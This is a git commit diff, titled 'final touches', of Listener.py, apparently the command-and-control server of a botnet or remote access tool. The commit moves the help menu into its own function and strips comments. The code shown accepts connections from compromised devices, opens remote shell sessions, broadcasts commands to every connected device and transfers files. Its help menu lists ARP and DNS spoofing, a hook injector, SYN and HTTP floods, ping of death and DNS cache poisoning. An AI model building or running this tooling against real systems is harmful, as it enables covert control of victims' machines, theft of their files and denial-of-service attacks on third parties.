ad3510660eb6643281b347110399b36df181c48a
pan0sSt <p.stavrinakis@gmail.com>
2020-12-28 14:30:12 -0500

    final touches

--- Listener.py
+++ Listener.py
@@ -8,6 +8,30 @@ import multiprocessing
 from time import sleep
 
 
+def help_message():
+    print("------------------------------------------------------------------------------------")
+    print("COMMANDS                                 DESCRIPTION")
+    print("------------------------------------------------------------------------------------")
+    print("help                                     Show commands")
+    print("exit                                     Exit the Center")
+    print("connections                              Show connected devices")
+    print("session <number>                         Open terminal of specific device")
+    print("sendall <command>                        Broadcast command to all connected devices")
+    print("--arpspoof                               Auto scan & arp spoof")
+    print("--dnsspoof <target-url> <spoofed-ip>     DNS spoof attack")
+    print("--hook                                   Hook injector")
+    print("--synflood <target-ip> <ports> <times>   SYN flood attack")
+    print("--httpflood <target-ip> <times>          HTTP flood attack")
+    print("--pod <target-ip> <times>                Ping of death attack")
+    print("--dnscachepoison <target-url>\n"
+          "  <nameserver> <auth-ip> <rec-ip>\n"
+          "  <spoof-url> <ports>                    DNS cache poisoning")
+    print("--killarp                                Kill process running arp spoof")
+    print("--killdns                                Kill process running dns spoof")
+    print("--killhook                               Kill process running hook injector")
+    print("------------------------------------------------------------------------------------")
+
+
 def write_file(path, content):
     with open(path, "wb") as file:
         file.write(base64.b64decode(content))
@@ -32,21 +56,18 @@ class Listener:
         self.listener.bind((self.ip, self.port))
         self.listener.listen(0)
 
-    # function that handles incoming connections
     def server(self):
         print("[+] Waiting for incoming connections..")
         while True:
             self.listener.settimeout(1)
             try:
-                connection, address = self.listener.accept()  # accept incoming connections
+                connection, address = self.listener.accept()
                 self.connections.append(connection)
                 self.addresses.append(address)
                 print("[+] Got a connection from {}".format(str(address)))
-            except Exception:
+            except:
                 pass
 
-    # function that checks for disconnected sockets !WARNING! DON'T ASK HOW IT WORKS! I DON'T KNOW EITHER! IT SHOULD
-    # NOT WORK BUT IT DOES! BASED ON DOCUMENTATIONS IT MAKES ZERO SENSE! DON'T CHANGE ANYTHING OR BAD THINGS HAPPEN!
     def check_connections(self):
         while True:
             sleep(15)
@@ -62,11 +83,10 @@ class Listener:
                     connection.close()
                     deletion.add(i)
             for i in deletion:
-                del self.connections[i-j]
-                del self.addresses[i-j]
+                del self.connections[i - j]
+                del self.addresses[i - j]
                 j += 1
 
-    # function that sends json objects through socket connection
     def reliable_send(self, data, i):
         json_data = json.dumps(data).encode('utf-8')
         try:
@@ -74,17 +94,15 @@ class Listener:
         except BrokenPipeError:
             print("[!] Broken Pipe.")
 
-    # function that receives json objects through socket connection
     def reliable_receive(self, i):
         json_data = "".encode('utf-8')
         while True:
             try:
                 json_data = json_data + self.connections[i].recv(1024)
                 return json.loads(json_data.decode('utf-8'))
-            except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
+            except json.decoder.JSONDecodeError:
                 continue
 
-    # function that sends command to the target and receives the results
     def execute_remotely(self, command, i):
         self.reliable_send(command, i)
         return self.reliable_receive(i)
@@ -101,33 +119,13 @@ class Listener:
                     try:
                         connection.send(json_data)
                         connection.close()
-                    except Exception:
+                    except:
                         print("[!] One connection not found.")
                 self.listener.close()
                 break
 
             elif command[0] == "help":
-                print("------------------------------------------------------------------------------------")
-                print("COMMANDS                                 DESCRIPTION")
-                print("------------------------------------------------------------------------------------")
-                print("help                                     Show commands")
-                print("exit                                     Exit the Center")
-                print("connections                              Show connected devices")
-                print("session <number>                         Open terminal of specific device")
-                print("sendall <command>                        Broadcast command to all connected devices")
-                print("--arpspoof                               Auto scan & arp spoof")
-                print("--dnsspoof <target-url> <spoofed-ip>     DNS spoof attack")
-                print("--hook                                   Hook injector")
-                print("--synflood <target-ip> <ports> <times>   SYN flood attack")
-                print("--httpflood <target-ip> <times>          HTTP flood attack")
-                print("--pod <target-ip> <times>                Ping of death attack")
-                print("--dnscachepoison <target-url>\n"
-                      "  <nameserver> <auth-ip> <rec-ip>\n"
-                      "  <spoof-url> <ports>                    DNS cache poisoning")
-                print("--killarp                                Kill process running arp spoof")
-                print("--killdns                                Kill process running dns spoof")
-                print("--killhook                               Kill process running hook injector")
-                print("------------------------------------------------------------------------------------")
+                help_message()
 
             elif command[0] == "connections":
                 for i, address in enumerate(self.addresses):
@@ -137,7 +135,7 @@ class Listener:
                 try:
                     self.num = int(command[1])
                     self.session()
-                except Exception:
+                except:
                     print("[!] Connection not found.")
 
             elif command[0] == "sendall":
@@ -152,14 +150,14 @@ class Listener:
                         json_data = json.dumps(new_command[1:]).encode('utf-8')
                         try:
                             connection.send(json_data)
-                        except Exception:
+                        except:
                             print("[!] One connection not found.")
                 else:
                     json_data = json.dumps(command[1:]).encode('utf-8')
                     for connection in self.connections:
                         try:
                             connection.send(json_data)
-                        except Exception:
+                        except:
                             print("[!] One connection not found.")
 
             else:
@@ -174,7 +172,7 @@ class Listener:
                 try:
                     if command[0] == "upload":
                         file_content = read_file(command[1])
-                        command.append(file_content.decode('utf-8'))  # add to the command the content of the file
+                        command.append(file_content.decode('utf-8'))
 
                     result = self.execute_remotely(command, self.num)
 
@@ -183,7 +181,7 @@ class Listener:
 
                     elif command[0] == "download" and "[-] Error " not in result:
                         result = write_file(command[1], result)
-                except Exception:
+                except:
                     result = "[-] Error during command execution."
                 print(result)
             else:
